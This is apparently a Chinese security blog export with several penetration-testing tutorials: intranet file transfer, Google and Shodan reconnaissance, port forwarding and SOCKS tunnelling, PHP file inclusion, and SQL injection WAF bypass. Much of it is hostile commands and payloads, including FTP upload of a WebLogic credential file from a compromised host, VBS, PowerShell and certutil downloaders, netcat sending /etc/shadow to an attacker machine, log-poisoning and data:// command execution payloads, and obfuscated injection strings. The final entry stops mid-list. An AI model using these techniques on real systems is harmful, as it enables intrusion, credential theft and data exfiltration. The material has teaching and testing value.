总体功能启动代码自动用火狐打开本地检测地图，嗅探指定网卡和指定过滤规则的流量并传入回调函数test，在回调函数test中进行数据的拆分，并对比特殊字符字典：sql.txt，将可疑流量进一步拆分，获取攻击者的IP、攻击时间、攻击的位置和payload以及提交方式，并记录到danger.log，日志中。在分析到可疑流量的时候将攻击者IP传递到printRecord函数利用GeoIP进行解析IP，进而获取到攻击者所在的城市、国家、经纬度和攻击次数并保存到数据库中，同时利用pyecharts生成Echarts中国地图，并提取数据库中的攻击者信息在地图上标记攻击者所在地点、IP和攻击次数，如果数据更新，则利用selenium模块中的webdriver动态覆盖并刷新地图。]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[内网文件传输]]></title>
    <url>%2F2018%2F12%2F03%2F%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%2F</url>
    <content type="text"><![CDATA[文件传输方法：windowsFTPftp -s:1.txt【-s将后面跟的1.txt内容全部当做命令行执行】（FTP传文件比较万能，任意类型文件都可上传） 实践：现有公网IP: 101.198.183.60，内网IP: 192.168.0.84的开发webloginc 7001端口并且有反序列化漏洞的主机一台，以及 公网IP: 101.198.183.68，内网IP: 192.168.0.98开放ftp服务的主机一台。 实施攻击的是不同网段的win7攻击机（可以访问公网，但是内网不可访问）。 开启FTP服务： 使用win7攻击机上的WebLogicExploit工具远程连接weblogic主机 1、echo open 192.168.0.98 2121 &gt;&gt; 1.txt //登陆FTP服务器 2、echo guoxiang&gt;&gt;1.txt //用户名 3、echo password&gt;&gt;1.txt //密码 4、echo bin&gt;&gt;1.txt //开始 5、echo put C:\Oracle\Middleware\user_projects\domains\college\security\SerializedSystemIni.dat&gt;&gt; 1.txt //下载程序 6、echo bye&gt;&gt;1.txt //关闭FTP服务器 然后执行ftp -s:1.txt 发现在ftp主机中出现了上传的文件。 用同一内网下含有反序列化任意命令执行漏洞的weblogic主机做跳板，用weblogic主机去攻击同一内网下的ftp主机。 VBSecho 下载文件程序&gt;&gt;loader.vbs cscript loader.vbs远程文件位置保存文件位置 echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; loader.vbs cscript loader.vbs http://192.168.0.98:7001/test/putty.exe C:\Users\linghuchong\Desktop\Tools\putty.exe putty.exe Powershellpowershell-exec bypass-c（new-object System.Net.WebClient）.DownloadFile（“远程文件位置“保存文件位置） powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://192.168.111.1:8080/test/putty.exe&apos;,&apos;C:\Users\linghuchong\Desktop\Tools\putty1.exe&apos;) putty1.exe certaincertutil.exe -urlcache -split -f 远程文件位置 certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe delete //删除缓存 putty.exe Linux攻击端监听端口，并重定向： nc -nvv -lp 4455 &gt; shaodw.txt 目标机将文件内容回传： nc 192.168.111.251 4455 &lt; /etc/shadow Wget（下载）wget http://192.168.111.1:8080/test/putty.exe curl支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 curl -O http://192.168.111.1:8080/test/putty.exe]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[搜索引擎——永不过时的渗透神器]]></title>
    <url>%2F2018%2F12%2F03%2F%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E2%80%94%E2%80%94%E6%B0%B8%E4%B8%8D%E8%BF%87%E6%97%B6%E7%9A%84%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[Google Hacking使用Google搜索引擎或其他Google应用程序通过特定语法来查找网站配置或代码中的安全漏洞搜索登录后台、特定文件、漏洞贡面、错误信息等等 逻辑运算符： +强制搜索其后的一个单词 -把某个字忽略 ~ 同意词博客设置 .单一的通配符 * 通配符，可代表多个字母 “” 精确查询 I 或 OR 只要符合多个关键字中的任意一个的结果予以显示 基本语法：intext:key 搜索网页带有关键字的页面 allintext:key 功能与intext，但是可以接多个关键字 intitle:key 搜索网页标题中是否有所输入的文字 allintitle:key 功能与intext，可以接多个关键字，但不能与别的关键字连用 Index of/(例如：index of/login) 使用它可以直接进入网站首页下的所有文件和文件夹中。（可以查看有没有目录遍历漏洞） cache:url 查看指定URL快照 filetype： 搜索指定类型文件 info： 搜索输入URL的摘要信息和其他相关信息，不能与其他关键词混用 inurl： 搜索输入字符是否存在于URL中，可以与site结合找后台 site： 搜索特定网站或者子域名 related:URL 搜索与该URL相关的页面 Link： link:thief.one可以返回所有和thief.one做了链接的URL。 搜索不同地域网站 inurl:tw 台湾 inurl:jp 日本 Google hacking语法数据库https://www.exploit-db.com/google-hacking-database/ 利用Google搜索C段服务器信息site:218.87.21.* 通过google可获取218.87.21.0/24网络的服务信息。 网络空间搜索引擎网络空间搜索引擎不同于搜索普通网页，而是直接搜索网络中存在主机，将主机信息汇聚成数据库，然后显示出主机的IP、端口、中间件、摄像头，工控设备banner、等其他网络设备信息。 同时可以按照普通搜索引擎规则来搜索网络设备：ip:&quot;192.168.1.0&quot;。 常见的搜索引擎：用法大多相同，这里只写shodan的用法。其他类比。 国内： zoomeye：（https://www.zoomeye.org/） fofa 国外： shodan（俗称黑暗谷歌） shodanhttps://www.shodan.io/ shoadn一刻不停的寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。 凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到 shodan可以在windows下网页中运行，也可以在linux下安装运行。 基本语法： hostname： 搜索指定的主机或域名，例如 hostname:”google” port： 搜索指定的端口或服务，例如 port:”21” country： 搜索指定的国家，例如 country:”CN” city： 搜索指定的城市，例如 city:”Hefei” org： 搜索指定的组织或公司，例如 org:”google” isp： 搜索指定的ISP供应商，例如 isp:”China Telecom” product： 搜索指定的操作系统/软件/平台，例如 product:”Apache httpd” version： 搜索指定的软件版本，例如 version:”1.6.2” geo： 搜索指定的地理位置，例如 vgeo:”31.8639, 117.2808” before/after： 搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”v net： 搜索指定的IP地址或子网，例如 net:”210.45.240.0/24” http.favicon.hash方法可以来搜索使用同一icon图标的网站。如果我想搜索带有这个icon的所有ip地址的话，可以先在Shodan搜索这个ip，这里要用到一个之前没注意到的东西，就是Shodan的原始数据（Raw Data）功能， 这里面有很多原始数据。 从中找到相应：data.0.http.favicon.hash字段 通过命令： http.favicon.hash:600245583 命令： net:&quot;114.242.146.0/24&quot; 命令： os:&quot;windows 7&quot; country:&quot;CN&quot; city:&quot;beijing&quot; 不仅可以运用标准操作。还可以直接搜索功能 在linux下得先对shodan进行安装pip install shodan 然后初始化shodan shodan init ‘key’ 这里的key是注册shodan账号时候给你的 count：统计结果 download：下载数据，数据格式json shodan parse --fields ip_str,port waiwang.json parse：解析json数据。 而且只取ip_str和port字段的值 shodan parse --fields ip_str,port waiwang.json |grep 80 shodan host 114.242.146.192 host：搜索指定IP shodan myip shodan search --fields ip_str,port net:&apos;114.242.146.0/24&apos; search：搜索内容]]></content>
      <categories>
        <category>Google Hacking</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[内网渗透——端口转发工具]]></title>
    <url>%2F2018%2F12%2F02%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Htranhttps://github.com/zcnhonker/HTran 正向端口转发服务端 htran.exe -tran 8888 192.168.1.1 3389 客户端 nc 服务端IP:8888 反向端口转发攻击机 htran.exe -listen 1234 8888 服务端 htran.exe -slave 攻击机IP 1234 127.0.0.1 3389 客户端 nc 127.0.0.1：8888 lcxhttps://guolala.top/2018/12/04/nc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/ Netshnetsh(Network Shell) 是一个windows系统本身提供的功能强大的网络配置命令行工具 Ipv4地址，转发本地8001端口到192.168.1.1的80端口 netsh interface portproxy add v4tov4 listenport=8001 connectport=80 connectaddress=192.168.1.1 删除转发规则 netsh interface portproxy delete v4tov4 listenport=9090查看现有规则 netsh interface portproxy show all 查看防火墙状态 netsh firewall show state netsh firewall set opmode disable 关闭防火墙 netsh firewall set opmode enable 启用防火墙 FpipeFPipe 是一款命令行下的端口映射工具，可以映射 TCP/UDP 协议，支持连接数的最大上限. 转发本地1080端口到远程的52345端口： FPipe.exe -l 1080 -r 52345 192.168.1.1 -v socks代理Socks代理相对端口转发更万便一些 reGeorgwindows下https://github.com/sensepost/reGeorg.git 这款工具的主要特点是服务端通常是一些web应用，例如php、aspx脚本。这样在目标仅仅开启了web服务的情况下我们也能做一个正向的socks代理。 它利用webshell建立一个socks代理进行内网穿透。 使用reGeorg需要安装setuptools（windows）和ez_setup.py（linux） https://pypi.python.org/pypi/setuptools#windows-simplified https://bootstrap.pypa.io/ez_setup.py 将setuptools 复制到 C:\Python27\（复制到python安装根目录）在命令提示符下切换到C:\Python27\，依次运行如下命令。 python setup.py build python setup.py install setuptools包含了pip，可直接用pip安装urllib3模块。命令提示符下切换到C:\Python27\Scripts，直接运行pip install urllib3 reGeorg工具安装完成。 使用参数 -h 帮助 -l 监听地址 -p 转发端口 -r 本地缓冲区，最大发送数据 -u 上传reGeorg脚本的地址 -v 详细显示 使用方法： 将下载内容的tunnel.jsp压缩（看网站），通过weblogic（各种文件上传）上传至服务器。 本地建立一个socks代理 切换到C:\Python27\，运行: python reGeorgSocksProxy.py -p 2333 -u http://192.168.209.159:7001/tunnel/tunnel.jsp 再用proxifier配置服务器 将python.exe添加列外，不然会死循环。 reGeorg在设计初，并未考虑Java中间件的问题，测试结果暂时支持Tomcat，所以如果服务器是Weblogic等中间件时候，可能会造成暂时无法访问3389远程桌面，或者卡在远程桌面 kali下使用代理vi proxychains.conf //编辑配置文件 dynamic_chain //取消此注释 socks5 127.0.0.1 7070 //添加代理 proxychains firefox proxychains nmap -vvv -n -sT -PN -p 80 192.168.0.1-255 rtcp.py利用 Python 的 Socket 端口转发，用于远程维护 如果连接不到远程，会 sleep 36s，最多尝试 200 次（即两小时） https://github.com/knownsec/rtcp 用法： ./rtcp.py stream1 stream2 stream 为：l:port 或 c:host:port l:port 表示监听指定的本地端口 c:host:port 表示监听远程指定的端口 转发本地8080端口到192.168.1.1的80端口 /rtcp.py 1:8080 c:192.168.1.1:80 使用场景： A 服务器在内网，公网无法直接访问这台服务器，但是 A 服务器可以联网访问公网的 B 服务器（假设 IP 为 222.2.2.2） 我们也可以访问公网的 B 服务器。我们的目标是访问 A 服务器的 22 端口。那么可以这样： 在 B 服务器上运行：./rtcp.py l:10001 l:10002 表示在本地监听了 10001 与 10002 两个端口，这样，这两个端口就可以互相传输数据了 在 A 服务器上运行：./rtcp.py c:localhost:22 c:222.2.2.2:10001 表示连接本地的 22 端口与 B 服务器的 10001 端口，这两个端口也可以互相传输数据了 然后我们就可以这样来访问 A 服务器的 22 端口了：ssh -p 10002 222.2.2.2 原理很简单，这个命令执行后，B 服务器的 10002 端口接收到的任何数据都会传给 10001 端口 此时，A 服务器是连接了 B 服务器的 10001 端口的，数据就会传给 A 服务器，最终进入 A 服务器的 22 端口 ssh+putty转发先安装： apt-get install putty 打开putty，配置SSH 配置SSH隧道 连接SSH并登录，保持窗口不关闭 访问8888端口——&gt;7001端口。 socat转发安装socat apt-get install socat 添加转发规则 socat TCP4-LISTEN:7777,reuseaddr,fork TCP4:192.168.0.92:7001 访问7777——&gt;7001. Earthworm：跨平台内网穿透神器基于标准C开发，具有socks5代理、端口转发和端口映射三大功能。 支持多平台，可穿透复杂的内网环境 https://github.com/rootkiter/EarthWorm 使用方法： -h 查看帮助 -s 指定链路状态(ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、 lcx_tran) ssocksd：正向socks5代理连接; rcsocks、rssocks：反向socks5代理连接; lcx_slave、lcx_listen：端口转发; lcx_tran：端口映射 -l 开放指定端口监听 -d 指定转发或反弹的主机地址 -e 指定转发或反弹的主机端口 -f 指定连接或映射的主机地址 -g 指定连接或映射的主机端口 -t 设置超时时间，默认为10000毫秒，即10秒(单位毫秒，-h显示有误)； -v 显示版本； -a 显示关于页面； 正向socks5代理(适用于目标拥有公网ip且可任意开监听端口)ew_for_Win.exe -s ssocksd -l 1080 在公网主机1.1.1.1上运行并开启端口为1080的socks5代理。 通过proxifier等代理工具访问1.1.1.1:1080使用1.1.1.1主机提供的socks5代理服务. 反向socks5代理(适用于目标无公网ip但可访问外网)：先在一台具有公网 ip 的主机A上运行以下命令： 在公网主机上添加转接隧道，将1080端口收到的代理请求转交给反弹到8888端口的主机。 相通机器：ew_for_Win.exe -s rcsocks -l 1080 -e 8888 将rcsocks改成lcx_listen也同样有效 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口： 在目标主机上开启socks5代理并反向连接到公网主机1.1.1.1的8888端口上。 目标主机：ew_for_Win.exe -s rssocks -d 1.1.1.1 -e 8888 通过proxifier等代理工具访问1.1.1.1:1080使用rssocks主机提供的socks5代理服务。 多级级联lcx_slave、lcx_listen、lcx_tran用法跟lcx一样。]]></content>
      <categories>
        <category>内网渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞详解]]></title>
    <url>%2F2018%2F12%2F02%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。 常见的导致文件包含（文件读取）的函数如下： PHP： include()：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。 require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。 require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。 当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。 接下来的测试会用下面这个非常简单的代码进行： &lt;?php $file = $_GET[&apos;file&apos;]; include $file; ?&gt; 同目录下有一个phpinfo.txt文件（内容为&lt;?php phpinfo();?&gt;） 文件包含有两种：本地文件包含、远程文件包含 （即加载远程文件，在php.ini中开启allow_url_include、allow_url_fopen选项。开启后可以直接执行任意代码。） 漏洞成因：程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞。 具有相关的文件包含函数。 文件包含函数中存在动态变量，比如 include $file;。 攻击者能够控制该变量，比如$file = $_GET[‘file’];。 php的文件包含利用在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 读取敏感文件访问：http://www.test.com/index.php?test=/etc/passwd,如果目标主机存在该文件，并且具有读权限，那么就可以读出文件内容。 远程包含shell allow_url_fopen = On allow_url_include = On 在远程文件http://10.60.17.60里写入测试代码。 &lt;?php fputs(fopen(&quot;text.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;) ?&gt; 访问http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php。将会在网站根目录下生成text.php文件，内容就是：”&lt;?php phpinfo(); ?&gt;“ 图片上传并包含图片shell利用方法和上面的一样，只是这次是本地包含，直接在上传的图片中写入测试代码并访问图片地址即可。 SSH log利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost 之后会提示输入密码等等，随便输入。 然后在remotehost的ssh-log中即可写入php代码： 之后进行文件包含即可。 包含日志文件GetShell利用条件：需要知道服务器日志的存储路径，且日志文件可读。 既然存在文件包含漏洞就可以利用漏洞读取apache的配置文件找到日志文件的位置。（默认：包含日志文件GetShell） 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。 但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改. 正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。 在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。 长度截断利用条件： php版本 &lt; php 5.2.8 目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./ index.php?file=././././省略././shell.txt 0字节截断包含利用条件： php版本 &lt; php 5.3.4 测试代码： &lt;?php $file = $_GET[&apos;file&apos;]; include $file.&apos;/tasdas/asd.php&apos;; ?&gt; http://127.0.0.1/123.php?file=phpinfo.txt%00 正常上传图片一句话并访问：http://test.com/index.php?test=1.jpg会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入http://test.com/index.php?test=1.jpg%00，就极有可能会绕过检测。这种方法只适用于php.ini中magic_quotes_qpc=off并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。 伪协议PHP伪协议其实就是PHP支持的协议和封装的协议， file: — 访问本地文件系统 http: — 访问 HTTP(s) 网址 ftp: — 访问 FTP(s) URLs php: — 访问各个输入/输出流（I/O streams）【php://stdin 是只读的， php://stdout 和 php://stderr 是只写的】 zlib: — 压缩流 data: — 数据（RFC 2397） glob: — 查找匹配的文件路径模式 phar: — PHP 归档 ssh2: — Secure Shell 2 rar: — RAR ogg: — 音频流 expect: — 处理交互式的流 有两个比较重要的配置在php.ini中，allow_url_fopen 和allow_url_include会影响到fopen和include等等函数对于伪协议的支持，而allow_url_include依赖allow_url_fopen，所以allow_url_fopen不开启的话，allow_url_include也是无法使用的。 File://用于访问文件系统。（可用于任意文件执行），在allow_url_fopen 和allow_url_include任何状态下都可以用。 data:// php版本大于等于php5.2 allow_url_fopen = On allow_url_include = On http://127.0.0.1/123.php?file=data:text/plain,&lt;?php phpinfo();?&gt; 任意命令执行 http://127.0.0.1/123.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt; 利用base64编码绕过 http://127.0.0.1/123.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt; phar://php版本大于等于php5.3.0 在网站根目录下有一个phpinfo.txt内容为&lt;?php phpinfo();?&gt;，打包成压缩包。 使用绝对路径： http://127.0.0.1/123.php?file=phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt 或者使用相对路径： http://127.0.0.1/123.php?file=phar://phpinfo.zip/phpinfo.txt zip:// – zlib:// –bzip2:// –zip://php版本大于等于php5.3.0 构造zip包的方法同phar 但是使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。 http://127.0.0.1/123.php?file=zip://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt http://127.0.0.1/123.php?file=zip://phpinfo.zip%23phpinfo.txt http://127.0.0.1/123.php?file=zip://./phpinfo.zip%23phpinfo.txt 压缩流：在allow_url_fopen 和allow_url_include任何状态下都可以用。 使用方法： http://127.0.0.1/test/1.php?f=zip://./1.zip%231.txt http://127.0.0.1/test/1.php?f=zip:///Applications/MAMP/htdos/test/1.zip%231.txt http://127.0.0.1/test/1.php?f=file=compress.bzip2:///Applications/MAMP/htdos/test/file.jpg http://127.0.0.1/test/1.php?f=file=compress.bzip2://./file.jpg 另一种思路：将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩，压缩文件 名为file.zip，如果可以上传zip文件便直接上传，如果不能则将file.zip重命名为file.jpg后上传，其他几种压缩格式也可以这样操作。 PHP://inputallow_url_include = On。 对allow_url_fopen不做要求。 可以访问请求的原始数据，简单来说POST请求下，php://input可以获取到post数据，如果enctype=”multipart/form-data” 的时候 php://input 是无效的。 php://outputphp://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。 php://filter对allow_url_include 和allow_url_fopen不做要求。 在任意文件读取或者getshell会用到这个伪协议。 http://127.0.0.1/123.php?file=php://filter/read=convert.base64-encode/resource=auth.php 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。 http://127.0.0.1/123.php?file=php://filter/convert.base64-encode/resource=auth.php 效果跟前面一样，少了read关键字。在绕过一些waf时也许有用。 php://filter类似于readfile()、file()、file_get_contents(),在数据流内容读取之前没有机会应用其他过滤器。 在include函数使用上，经常会造成任意文件读取漏洞，而file_get_contents()和file_put_contents()这样函数下，常常会构成getshell等更严重的漏洞。 php://filter 目标使用以下的参数作为它路径的一部分: resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 目录遍历现在在C:\phpStudy\PHPTutorial\phpinfo.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历。 http://127.0.0.1/123.php?file=../phpinfo.txt 实际拼接路径为：C:\phpStudy\PHPTutorial\WWW..\phpinfo.txt即C:\phpStudy\PHPTutorial\phpinfo.txt 编码绕过服务器端常常会对于 ../ 等做一些过滤，可以用一些编码来进行绕过。 利用url编码 ../： %2e%2e%2f ..%2f %2e%2e/ ..\： %2e%2e%5c ..%5c %2e%2e\ 二次编码 ../： %252e%252e%252f ..\： %252e%252e%255c 容器/服务器的编码方式 ../： ..%c0%af %c0%ae%c0%ae/（java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）） ..\： ..%c1%9c 利用协议测试代码： &lt;?php $file = $_GET[&apos;file&apos;]; include $file.&apos;/test/test.php&apos;; ?&gt; 构造压缩包结构如下： http://127.0.0.1/1.php?file=zip://C:\phpStudy\PHPTutorial\WWW\test.zip%23test http://127.0.0.1/1.php?file=phar://C:\phpStudy\PHPTutorial\WWW\test.zip 利用zip协议，注意要指定绝对路径 则拼接后为：zip://C:\phpStudy\PHPTutorial\WWW\test%23test/test/test.php 变量覆盖$$导致的变量覆盖，举个例子 $key = ‘hello’ $hello = ‘world’ echo $$key 输出world 文件包含修复方案 禁止远程文件包含： allow_url_include=off 配置 open_basedir=指定目录，限制访问区域。 过滤../等特殊符号 修改Apache日志文件的存放地址 开启魔术引号 magic_quotes_qpc=on 尽量不要使用动态变量调用文件，直接写要包含的文件]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL的WAF绕过]]></title>
    <url>%2F2018%2F12%2F02%2FSQL%E7%9A%84WAF%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。 WAF的功能 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。 WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。 WAF常见特点 异常检测协议：拒绝不符合HTTP标准的请求 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证 白名单&amp;黑名单：白名单适用于稳定的Web应用，黑名单适合处理已知问题 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活 状态管理：重点进行会话保护 另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等 WAF识别扫描器 1) 扫描器指纹(head字段/请求参数值)，以awvs为例，会有很明显的Acunetix在内的标识 2) 单IP+ cookie某时间段内触发规则次数 3) 隐藏的链接标签等(&lt;a&gt;) 4） Cookie植入 5) 验证码验证，扫描器无法自动填充验证码 6) 单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏 WAF绕过思路根据WAF部署位置，针对WAF、WEB服务器、WEB应用对协议解析、字符解析、文件名解析、编码解析以及SQL语法解析的差异，绕过WAF，将payload送至服务器执行。 大小写绕过这个大家都很熟悉，对于一些太垃圾的WAF效果显著，比如拦截了union，那就使用Union、UnIoN等等绕过。 编码绕过比如WAF检测关键字，那么我们让他检测不到就可以了。比如检测union，那么我们就用%55也就是U的16进制编码来代替U，union写成 %55nION，结合大小写也可以绕过一些WAF，你可以随意替换一个或几个都可以。 也还有大家在Mysql注入中比如表名或是load文件的时候，会把文件名或是表明用16进制编码来绕过WAF都是属于这类。 ####（1）URL编码： 在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29，/为%25。 普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过： ?id=1%252f%252a*/UNION%252f%252a /SELECT————————&gt;经过两次URL解码= ?id=1/**/UNION/* /SELECT ####（2）十六进制编码： /index.php?page_id=-15/*!u%6eion*//*!se%6cect*/ 1,2,3,4，SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) 示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点 ####（3）Unicode编码： Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了 常用的几个符号的一些Unicode编码： 单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8 右括号：%u0029、%uff09、\c0%29、\c0%a9、%e0%80%a9 ?id=10%D6&apos;%20AND%201=2%23 SELECT &apos;Ä&apos;=&apos;A&apos;; #1 一：前者利用宽字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个宽字节即Unicode字节，单引号可以正常使用 二：示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过 三：另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过 替换关键字这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过。 index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 建议不要对此抱有太大希望…. 使用注释常见的注释符： // -- /**/ # --+ -- - ; --a （1）普通注释index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4&apos;union%a0select pass from users# /**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别; #、–+用于终结语句的查询 （2）内联注释相比普通注释，内联注释用的更多，它有一个特性/*! */只有MySQL能识别(/*! */表示注释里面的语句会被执行) 实例一： ?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 实例二： ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4… 两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点当然前提是包括/、*在内的这些字符能正常使用 等价函数与命令有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用 ####（1）函数或变量 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() 比如substr()被过滤了可以用mid()和left()、right()等函数。 substr((select &apos;password&apos;),1,1) = 0x70 strcmp(left(&apos;password&apos;,1), 0x69) = 1 strcmp(left(&apos;password&apos;,1), 0x70) = 0 strcmp(left(&apos;password&apos;,1), 0x71) = -1 ####（2）符号 and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了。在看一下用得多的空格，可以使用如下符号表示其作用：%20、%09、%0a、%0b、%0c、%0d、/**/ ####（3）生僻函数 MySQL/PostgreSQL支持XML函数： Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’); ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror)); //postgresql ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制。 特殊符号乌云drops上“waf的绕过技巧”一文使用的几个例子： 使用反引号`，例如select `version()`，可以用来绕过空格和正则，特殊情况下还可以将其做注释符用 神奇的-+.，select+id-1+1.from users; +是用于字符串连接的，-和.在此也用于连接，可以逃过空格和关键字过滤 @符号，select@^1.from users; `@用于变量定义如@var_name，一个@表示用户定义，@@`表示系统变量 select-count(id)test from users; //绕过空格限制 部分可能发挥大作用的字符(前文中没怎么说到的): ` ~ ! @ % () [] . - + | %00 关键字拆分： ‘se’+’lec’+’t’ %S%E%L%E%C%T 1 